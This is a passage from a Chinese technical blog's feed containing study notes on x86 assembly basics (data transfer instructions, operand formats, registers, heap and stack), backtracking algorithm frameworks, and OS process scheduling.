<p>可以看到，之前栈顶的内容已经被弹出到%edx寄存器，并且当前栈顶已经移动到了-16的位置，也就是进行了+4操作。因此popl %edx指令就相当于下面两条指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">movl (%esp),%edx</div><div class="line">addl $4,%esp</div></pre></td></tr></table></figure></p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer15.html" target="_blank" rel="external">深入理解计算机系统（3.3）—数据传送（或者说复制）指令详解</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;数据传送指令&quot;&gt;&lt;a href=&quot;#数据传送指令&quot; class=&quot;headerlink&quot; title=&quot;数据传送指令&quot;&gt;&lt;/a&gt;数据传送指令&lt;/h3&gt;&lt;p&gt;据传送指令的目的是为了将一个数据从一个位置复制到另外一个位置。既然如此，那么数据传送指令就会包含一个源操作数
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-1</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-1/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-汇编的世界-1/</id>
    <published>2018-05-05T20:38:21.000Z</published>
    <updated>2018-05-05T12:46:53.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="汇编层次的对象"><a href="#汇编层次的对象" class="headerlink" title="汇编层次的对象"></a>汇编层次的对象</h3><p>在平时的开发过程中，CPU处理器的状态对开发者是隐藏的，我们看不到CPU当中各个对象的状态。但是在汇编语言中，我们可以清楚的看到这些对象的状态，其中CPU主要包含以下几个对象。</p>
<ul>
<li>程序计数器（PC）：记录下一条指令的地址。</li>
<li>整数寄存器文件：共8个，可以存储一些地址或者整数的数据。</li>
<li>条件寄存器：保存算数或逻辑指令的状态信息，可以实现程序的流程控制。</li>
<li>浮点寄存器：存储浮点数。</li>
</ul>
<p>　　可以看出，这些都是CPU处理器当中的对象，这是汇编层面能操作的寄存器，当然，还有一节寄存器是我们不能操作的，比如说时钟寄存器。</p>
<h3 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h3><p>在汇编指令中，有三种表示数据的格式：</p>
<ul>
<li>一种是$符号后跟一个标准C表示的整数，比如$100，$0x11等等</li>
<li>第二种则是寄存器，当它作为一个操作数的时候，则是取的寄存器当中的数值。另外，对于寄存器来说，也可以选择性的操作4个、2个、1个字节，而并不一定非要操作4个字节</li>
<li>最后一种，则是我们相对来说最熟悉的，就是存储器或者说内存。当它作为一个操作数的时候，会去计算存储器地址的数值，然后去这个地址取相应的数值。</li>
</ul>
<p><img src="/images/汇编-05.png" alt="数据格式"></p>
<p>第一列是代表的类型，而第一行则是指的立即数，第二行则是指的寄存器，而剩下的都是存储器了。对于立即数和寄存器来讲，比较好理解，就是直接取值或者取寄存器的值。而对于存储器来讲，则有很多种情况，不过我们也可以看出，上面所有的情况，其实都是最后一种的特殊情况。Imm(Eb,Ei,s)是存储器取值的一般形式，比如当Imm为0时，则是倒数第二种取值方式。对于其它的形式，也可以使用同样的方式推算出来。</p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer14.html" target="_blank" rel="external">深入理解计算机系统（3.2）—数据格式、访问信息以及操作数指示符</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;汇编层次的对象&quot;&gt;&lt;a href=&quot;#汇编层次的对象&quot; class=&quot;headerlink&quot; title=&quot;汇编层次的对象&quot;&gt;&lt;/a&gt;汇编层次的对象&lt;/h3&gt;&lt;p&gt;在平时的开发过程中，CPU处理器的状态对开发者是隐藏的，我们看不到CPU当中各个对象的状态。但是在汇
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|走进汇编的世界</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E8%B5%B0%E8%BF%9B%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-走进汇编的世界/</id>
    <published>2018-05-05T20:03:58.000Z</published>
    <updated>2018-05-05T12:36:59.063Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什么，以及代码的运行步骤，就一定要学习汇编语言。</p>
<h3 id="What"><a href="#What" class="headerlink" title="What"></a>What</h3><p>我们知道，CPU 只负责计算，本身不具备智能。你输入一条指令（instruction），它就运行一次，然后停下来，等待下一条指令。</p>
<p>这些指令都是二进制的，称为操作码（opcode），比如加法指令就是00000011。编译器的作用，就是将高级语言写好的程序，翻译成一条条操作码。</p>
<p>对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。</p>
<p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令00000011写成汇编语言就是 ADD。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>
<h3 id="初次体会汇编"><a href="#初次体会汇编" class="headerlink" title="初次体会汇编"></a>初次体会汇编</h3><p>在编译一段C语言程序的过程中，其实做了很多步骤，比如预编译处理、编译处理、汇编处理以及链接处理。我们要了解的汇编语言，就是在编译处理后的产物。因此我们可以在GCC的编译器当中加入一些参数来控制它只生成汇编语言，而不进行汇编处理和链接处理。</p>
<p>我们看下面这一段简单的C语言代码，假设为sum.c。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">int simple(int *xp,int y)&#123;</div><div class="line">    int t = *xp+y;</div><div class="line">    *xp=t;</div><div class="line">    return t;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们使用GCC编译器加-S参数来编译这段代码，最终我们可以得到一个sum.s的文件，我们使用cat来查看一下这个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.file    &quot;sum.c&quot;</div><div class="line">    .text</div><div class="line">.globl simple</div><div class="line">    .type    simple, @function</div><div class="line">simple:</div><div class="line">    pushl    %ebp</div><div class="line">    movl    %esp, %ebp</div><div class="line">    subl    $16, %esp</div><div class="line">    movl    8(%ebp), %eax//这一步是从主存取变量xp</div><div class="line">    movl    (%eax), %eax//取*xp的值</div><div class="line">    addl    12(%ebp), %eax//计算*xp+y，并存到%eax寄存器</div><div class="line">    movl    %eax, -4(%ebp)//将*xp+y赋给变量t</div><div class="line">    movl    8(%ebp), %eax//再取xp</div><div class="line">    movl    -4(%ebp), %edx//取t</div><div class="line">    movl    %edx, (%eax)//执行t-&gt;*xp</div><div class="line">    movl    -4(%ebp), %eax//将t放入%eax准备返回</div><div class="line">    leave</div><div class="line">    ret</div><div class="line">    .size    simple, .-simple</div><div class="line">    .ident    &quot;GCC: (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3&quot;</div><div class="line">    .section    .note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure></p>
<p>有些人可能会惊讶，为什么我们的源代码只有短短的三行，但是汇编的代码却有这么多行。这是很正常的，汇编指令能做的事情是很简单的，比如我们的加法运算，我们需要去内存中找到操作数，把内存中的操作数存在寄存器中，然后在进行加法运算。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>学习汇编语言，首先必须了解两个知识点：寄存器和内存模型。</p>
<p>先来看寄存器。CPU 本身只负责运算，不负责储存数据。数据一般都储存在内存之中，CPU 要用的时候就去内存读写数据。但是，CPU 的运算速度远高于内存的读写速度，为了避免被拖慢，CPU 都自带一级缓存和二级缓存。基本上，CPU 缓存可以看作是读写速度较快的内存。</p>
<p>但是，CPU 缓存还是不够快，另外数据在缓存里面的地址是不固定的，CPU 每次读写都要寻址也会拖慢速度。因此，除了缓存之外，CPU 还自带了寄存器（register），用来储存最常用的数据。也就是说，那些最频繁读写的数据（比如循环变量），都会放在寄存器里面，CPU 优先读写寄存器，再由寄存器跟内存交换数据。</p>
<p>寄存器不依靠地址区分数据，而依靠名称。每一个寄存器都有自己的名称，我们告诉 CPU 去具体的哪一个寄存器拿数据，这样的速度是最快的。有人比喻寄存器是 CPU 的零级缓存。</p>
<p><img src="/images/汇编-04.png" alt="寄存器"></p>
<h3 id="内存模型：Heap"><a href="#内存模型：Heap" class="headerlink" title="内存模型：Heap"></a>内存模型：Heap</h3><p>寄存器只能存放很少量的数据，大多数时候，CPU 要指挥寄存器，直接跟内存交换数据。所以，除了寄存器，还必须了解内存怎么储存数据。</p>
<p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址</p>
<p><img src="/images/汇编-03.png" alt="内存模型"></p>
<p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用malloc命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址0x1000开始给他分配，一直分配到地址0x100A，如果再要求得到22个字节，那么就分配到0x1020。</p>
<p><img src="/images/汇编-01.png" alt="内存模型"></p>
<p>这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。</p>
<h3 id="内存模型：Stack"><a href="#内存模型：Stack" class="headerlink" title="内存模型：Stack"></a>内存模型：Stack</h3><p>除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。这里所说的栈与数据结构里的栈的思想是一样的，数据的操作都是<code>后进先出</code>。为什么这样呢，栈是为函数调用服务的，最后调用的函数进栈，哪当然是最后调用的函数先执行完，然后释放其占用的空间。<br><img src="/images/汇编-02.png" alt="Stack模型"></p>
<p><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="external">汇编语言入门教程</a><br><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html" target="_blank" rel="external">深入理解计算机系统（3.1）—走进汇编的世界</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;计算机真正能够理解的是低级语言，它专门用来控制硬件。汇编语言就是低级语言，直接描述/控制 CPU 的运行。如果你想了解 CPU 到底干了些什
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|回溯法</title>
    <link href="http://yoursite.com/2018/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
    <id>http://yoursite.com/2018/05/04/计算机算法-回溯法/</id>
    <published>2018-05-03T23:08:09.000Z</published>
    <updated>2018-05-03T16:38:43.022Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>回溯算法(Backtracking)</code>实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。</p>
<p>回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。</p>
<p>许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。</p>
<p>用爬山来比喻回溯，好比从山脚下找一条爬上山顶的路,起初有好几条道可走,当选择一条道走到某处时,又有几条岔道可供选择,只能选择其中一条道往前走,若能这样子顺利爬上山顶则罢了,否则走到一条绝路上时,只好返回到最近的一个路口,重新选择另一条没走过的道往前走。如果该路口的所有路都走不通,只得从该路口继续回返。照此规则走下去,要么找到一条到达山顶的路,要么最终试过所有可能的道,无法到达山顶。</p>
<p><strong>回溯是一种穷举，但与brute force有一些区别，回溯带了两点脑子的，并不多，brute force一点也没带。</strong></p>
<ul>
<li>第一点脑子是回溯知道回头；相反如果是brute force,发现走不通立刻跳下山摔死，换第二条命从头换一条路走。</li>
<li>第二点脑子是回溯知道剪枝；如果有一条岔路上放了一坨屎，那这条路我们不走，就可以少走很多不必要走的路。</li>
</ul>
<p>回溯法搜索解空间树的时候，通常有两种策略来避免无效搜索，即 剪枝函数：</p>
<ul>
<li>约束函数：在扩展节点处剪去不满足约束的子树，</li>
<li>限界函数：剪去不能得到最优解的子树。</li>
</ul>
<p>还有一些爱混淆的概念：递归，回溯，DFS。</p>
<ul>
<li>回溯是一种找路方法，搜索的时候走不通就回头换路接着走，直到走通了或者发现此山根本不通。</li>
<li>DFS是一种开路策略，就是一条道先走到头，再往回走一步换一条路走到头，这也是回溯用到的策略。<strong>在树和图上回溯时人们叫它DFS。</strong></li>
<li>递归是一种行为，回溯和递归如出一辙，都是一言不合就回到来时的路，所以一般回溯用递归实现；当然也可以不用，用栈。</li>
</ul>
<h3 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h3><p>在包含问题的所有解的解空间树中，按照深度优先搜索的策略，从根结点出发深度探索解空间树。当探索到某一结点时，要先判断该结点是否包含问题的解，如果包含，就从该结点出发继续探索下去，如果该结点不包含问题的解，则逐层向其祖先结点回溯。（其实回溯法就是对隐式图的深度优先搜索算法）。</p>
<p>若用回溯法求问题的所有解时，要回溯到根，且根结点的所有可行的子树都要已被搜索遍才结束。</p>
<p>而若使用回溯法求任一个解时，只要搜索到问题的一个解就可以结束。</p>
<h3 id="用回溯法解题的一般步骤"><a href="#用回溯法解题的一般步骤" class="headerlink" title="用回溯法解题的一般步骤"></a>用回溯法解题的一般步骤</h3><ol>
<li>针对所给问题，确定问题的解空间：首先应明确定义问题的解空间，问题的解空间应至少包含问题的一个（最优）解。</li>
<li>确定结点的扩展搜索规则</li>
<li>以深度优先方式搜索解空间，并在搜索过程中用剪枝函数避免无效搜索。</li>
</ol>
<h3 id="算法框架"><a href="#算法框架" class="headerlink" title="算法框架"></a>算法框架</h3><p>问题框架</p>
<p>设问题的解是一个n维向量(a1,a2,………,an),约束条件是ai(i=1,2,3,…..,n)之间满足某种条件，记为f(ai)。</p>
<p>非递归回溯框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"> 1: int a[n],i;</div><div class="line"> 2: 初始化数组a[];</div><div class="line"> 3: i = 1;</div><div class="line"> 4: while (i&gt;0(有路可走)   and  (未达到目标))  // 还未回溯到头</div><div class="line"> 5: &#123;</div><div class="line"> 6:     if(i &gt; n)                                              // 搜索到叶结点</div><div class="line"> 7:     &#123;   </div><div class="line"> 8:           搜索到一个解，输出；</div><div class="line"> 9:     &#125;</div><div class="line">10:     else                                                   // 处理第i个元素</div><div class="line">11:     &#123; </div><div class="line">12:           a[i]第一个可能的值；</div><div class="line">13:           while(a[i]在不满足约束条件且在搜索空间内)</div><div class="line">14:           &#123;</div><div class="line">15:               a[i]下一个可能的值；</div><div class="line">16:           &#125;</div><div class="line">17:           if(a[i]在搜索空间内)</div><div class="line">18:          &#123;</div><div class="line">19:               标识占用的资源；</div><div class="line">20:               i = i+1;                              // 扩展下一个结点</div><div class="line">21:          &#125;</div><div class="line">22:          else </div><div class="line">23:         &#123;</div><div class="line">24:               清理所占的状态空间；            // 回溯</div><div class="line">25:               i = i –1; </div><div class="line">26:          &#125;</div><div class="line">27: &#125;</div></pre></td></tr></table></figure></p>
<p>递归的算法框架</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"> 1: int a[n];</div><div class="line"> 2: try(int i)</div><div class="line"> 3: &#123;</div><div class="line"> 4:     if(i&gt;n)</div><div class="line"> 5:        输出结果;</div><div class="line"> 6:      else</div><div class="line"> 7:     &#123;</div><div class="line"> 8:        for(j = 下界; j &lt;= 上界; j=j+1)  // 枚举i所有可能的路径</div><div class="line"> 9:        &#123;</div><div class="line">10:            if(fun(j))                 // 满足限界函数和约束条件</div><div class="line">11:              &#123;</div><div class="line">12:                 a[i] = j;</div><div class="line">13:               ...                         // 其他操作</div><div class="line">14:                 try(i+1);</div><div class="line">15:               回溯前的清理工作（如a[i]置空值等）;</div><div class="line">16:               &#125;</div><div class="line">17:          &#125;</div><div class="line">18:      &#125;</div><div class="line">19: &#125;</div></pre></td></tr></table></figure>
<p>DFS递归</p>
<p>回溯法的递归伪代码描述：</p>
<pre><code>void backtrack(int t)
{
    if(t &gt; n) output(x);
    else
        for (int i = f(n,t); i &lt;= g(n,t); ++i) {
            x[t] = h(i);
            if(constraint(t) &amp;&amp; bound(t)) backtrack(t+1);
        }
}
</code></pre><p>其中，</p>
<ul>
<li>参数 t 表示递归深度，即当前扩展节点在解空间树中的深度，</li>
<li>n 解空间树的高度，当 t&gt;n 时，表示已搜索到一个叶节点，</li>
<li>output(x) 打印可行解，</li>
<li>f(n,t) 和 g(n,t) 分别表示当前扩展节点处子树的起止编号，</li>
<li>h(i) 表示当前扩展节点处 x[t] 的第i个可选值，</li>
<li>constraint(t) 和 bound(t) 分别为约束函数和限界函数，用于剪枝。</li>
</ul>
<p>DFS迭代<br>回溯法的迭代伪代码描述：</p>
<pre><code>void iterative_backtrack()
{
    int t = 1;
    while (t &gt; 0) {
        if (f(n,t) &lt;= g(n,t)) {
            for (int i = f(n,t); i &lt;= g(n, t); ++i) {
                x[t] = h(i);
                if (constraint(t) &amp;&amp; bound(t)) {
                    if (solution(t)) output(x);
                    else ++t;
                }
            }
        } else {
            --t;
        }
    }
}
</code></pre><p>其中，</p>
<ul>
<li>solution(t) 判断当前扩展节点处是否已得到一个可行解。</li>
</ul>
<h3 id="常见回溯问题"><a href="#常见回溯问题" class="headerlink" title="常见回溯问题"></a>常见回溯问题</h3><h4 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a>排列问题</h4><p>常见问题描述：<code>求字符集合的所有排列。</code></p>
<p>思路：我们以三个字符abc为例来分析一下求字符串排列的过程。首先固定第一个字符a，求后面两个字符bc的排列。当两个字符bc的排列求好之后，我们把第一个字符a和后面的b交换，得到bac，接着我们固定第一个字符b，求后面两个字符ac的排列。现在是把c放到第一位置的时候了。记住前面我们已经把原先的第一个字符a和后面的b做了交换，为了保证这次c仍然是和原先处在第一位置的a交换，我们在拿c和第一个字符交换之前，先要把b和a交换回来。在交换b和a之后，再拿c和处在第一位置的a进行交换，得到cba。我们再次固定第一个字符c，求后面两个字符b、a的排列。</p>
<h4 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h4><p>常见问题描述：<code>求字符集合的m种组合。</code></p>
<p>思路：字符集合可以用一个长度为n的无重复字符的字符串表示。我们从头扫描字符串的第一个字符。针对第一个字符，有两种选择：一是把这个字符放到组合中去，接下来我们需要在剩下的n-1个字符中选取m-1个字符；二是不把这个字符放到组合中去，接下来我们需要在剩下的n-1个字符中选择m个字符。同样用递归的思路解决这个问题。</p>
<h4 id="子集和问题"><a href="#子集和问题" class="headerlink" title="子集和问题"></a>子集和问题</h4><p>常见子集和问题描述：<code>给定一个正整数集合A和正整数S，求A所有可能的子集A&#39;，其中A&#39;中所有元素之和等于S。</code></p>
<h4 id="8皇后问题"><a href="#8皇后问题" class="headerlink" title="8皇后问题"></a>8皇后问题</h4><p>8皇后的一个关键是确定约束函数，即如何判断某个位置是否可以放置一个皇后。</p>
<p>由于是在棋盘上，考虑利用坐标系解决：如果给这个8*8的矩阵上个坐标，横向(rows)为i = 0 to 7，纵向(columns)为j = 0 to 7。那么可以发现，在每一条斜线(/)方向上，每一个格子的横纵坐标之和(i + j)是一个固定值，从左上到右下的斜线，其值依次是0~14 (0+0; 0+1,1+0; 0+2,1+1,2+0; … ; 6+7,7+6; 7+7)；同样地，在每一条反斜线()方向上，每一个格子的横坐标与纵坐标的关系 (i + (7 - j)) 也是固定值，从右上到左下的斜线，其值依次是0~14。</p>
<p><a href="https://www.cnblogs.com/steven_oyj/archive/2010/05/22/1741376.html" target="_blank" rel="external">五大常用算法之四：回溯法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;&lt;code&gt;回溯算法(Backtracking)&lt;/code&gt;实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|关于cpu管理</title>
    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%85%B3%E4%BA%8Ecpu%E7%AE%A1%E7%90%86/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-关于cpu管理/</id>
    <published>2018-04-28T11:02:54.000Z</published>
    <updated>2018-04-28T04:20:50.057Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/edisonchou/p/5003694.html" target="_blank" rel="external">进程</a></p>
<h3 id="从单任务到多道任务"><a href="#从单任务到多道任务" class="headerlink" title="从单任务到多道任务"></a>从单任务到多道任务</h3><p>最开始的时候，计算机只能一个一个程序的运行，后来人们需求多了，需要在工作的同时还能听听歌、聊天…所以就发展到了多道任务的时代。同时，单一操作员单一控制终端，CPU使用率很低；多道任务也提高计算机CPU的利用率。</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>多道任务的思想虽然表面上看是多个程序同时运行，但在计算机的内部还是一次只能执行一个任务，造成同时运行的表象是因为cpu能做到快速切换。</p>
<p>我们都知道一个任务在运行的时候，是有它自己的状态的，比如说当前的指令是什么、下一条指令在哪里…专业点讲就是寄存器、程序计数器、状态字、栈指针、优先级、进程ID、创建时间、所耗CPU时间、当前持有的各种句柄等等。当CPU进行切换的时候，为了保证下次切换回来能恢复这些状态，就要有一个数据结构能保存这些数据，这就是<code>进程控制块（Process Control Block，PCB）</code>。</p>
<p>同时为了管理的方便，也引出了<code>进程</code>的概念，作为任务的另一说法。</p>
<blockquote>
<p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p>
</blockquote>
<p>所以，多道任务的理解就是：</p>
<p><strong>操作系统将需要运行的程序载入到内存中，并通过某种策略进行切换、分配cpu执行权限，给用户一种多进程同时运行的假象。</strong></p>
<h4 id="多视角度解读进程"><a href="#多视角度解读进程" class="headerlink" title="多视角度解读进程"></a>多视角度解读进程</h4><p><img src="/images/操作系统-关于cpu管理01.jpg" alt="多视角度解读进程"></p>
<ul>
<li><p>物理视角：从物理内存的分配来看，每个进程占用一片内存空间，从这点上看，进程其实就是内存的某片空间。由于在任意时刻，一个CPU只能执行一条指令，因此任意时刻在CPU上执行的进程只有一个，而到底执行哪条指令是由物理程序计数器指定。因此，<strong>在物理层面，所有进程共用一个程序计数器，只是CPU在不停地做进程切换</strong>。</p>
</li>
<li><p>逻辑视角：从逻辑层面来看，每个进程都可以执行，也可以暂时挂起让别的进程执行，之后又可以接着执行。所以，进程需要想办法保持状态才能在下次接着执行时从正确的地点开始。因此，每个进程都有自己的计数器，记录其下一条指令所在的位置。（从逻辑上来说，程序计数器可以有多个）</p>
</li>
<li><p>时序视角：从时间来看，每个进程都必须往前推进。在运行一定时间后，进程都应该完成了一定的工作量。换句话说，每次进程返回，它都处在上次返回点之后。哲学家有云：“一个人不能两次踏入同一条河流”</p>
</li>
</ul>
<h3 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h3><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p><img src="/images/操作系统-关于CPU管理02.gif" alt="进程状态"></p>
<h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>既然有多个进程在内存中等待执行，就需要有一种合理的策略来安排执行的顺序。首先，一般的程序任务分为三种：CPU计算密集型、IO密集型与平衡（计算与IO各半）型，对于不同类型的程序，调度需要达到的目的也有所不同。对于IO密集型，响应时间最重要；对于CPU密集型，则周转时间最重要；而对于平衡型，进行某种响应和周转之间的平衡就显得比较重要。</p>
<p>因此，进程调度的目标就是要达到极小化平均响应时间、极大化系统吞吐率、保持系统各个功能部件均处于繁忙状态和提供某种貌似公平的机制。</p>
<h4 id="基本调度算法"><a href="#基本调度算法" class="headerlink" title="基本调度算法"></a>基本调度算法</h4><h5 id="先来先服务算法"><a href="#先来先服务算法" class="headerlink" title="先来先服务算法"></a>先来先服务算法</h5><p><img src="/images/操作系统-关于CPU管理03.jpg" alt="FCFS"></p>
<p>先来先服务（FCFS）算法是一种最常见的算法，它是人的本性中的一种公平观念。其优点就是简单且实现容易，缺点则是短的工作有可能变得很慢，因为其前面有很长的工作在执行，这样就会造成用户的交互式体验也比较差。</p>
<p>例如排队办理业务时，你要办理的业务只需要几分钟就可以办好，但是你前面的一个人办理的事情很复杂需要1个小时，这时你需要在他后面等很久，于是你就想到：要是每个人轮流办理10分钟事务的话，那该多好！于是就出现了时间片轮转算法。</p>
<h5 id="时间片轮转算法"><a href="#时间片轮转算法" class="headerlink" title="时间片轮转算法"></a>时间片轮转算法</h5><p><img src="/images/操作系统-关于cpu管理04.jpg" alt="RR"></p>
<p>时间片轮转是对FCFS算法的一种改进，其主要目的是改善短程序的响应时间，实现方式就是周期性地进行进程切换。时间片轮转的重点在于时间片的选择，需要考虑多方因素：如果运行的进程多时，时间片就需要短一些；进程数量少时，时间片就可以适当长一些。因此，时间片的选择是一个综合的考虑，权衡各方利益，进行适当折中。</p>
